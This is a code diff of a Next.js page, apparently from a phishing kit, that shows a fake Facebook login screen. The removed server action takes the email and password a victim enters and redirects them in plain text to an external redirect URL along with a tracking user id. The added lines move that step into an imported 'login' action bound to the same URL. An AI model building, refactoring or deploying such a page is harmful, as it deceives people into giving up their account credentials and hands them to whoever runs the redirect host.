@@ -1,7 +1,8 @@
-import { FacebookLanding } from "@/components/component/facebook-landing";
+import { login } from "@/actions";
+import Component from "@/components/facebook-landing";
 import { env } from "@/env.mjs";
 import type { Metadata } from "next";
-import { notFound, redirect } from "next/navigation";
+import { notFound } from "next/navigation";
 import { z } from "zod";
 
 interface PageProps {
@@ -30,14 +31,5 @@ export default function Page({ searchParams }: PageProps) {
   if (!parsed.success) notFound();
   const { userId, url } = parsed.data;
   const baseUrl = `${env.REDIRECT_URL}?url=${url}&userid=${userId}`;
-  return (
-    <FacebookLanding
-      action={async (formData: FormData) => {
-        "use server";
-        const email = formData.get("email") as string;
-        const password = formData.get("password") as string;
-        redirect(`${baseUrl}&username=${email}&password=${password}`);
-      }}
-    />
-  );
+  return <Component action={login.bind(null, baseUrl)} />;
 }
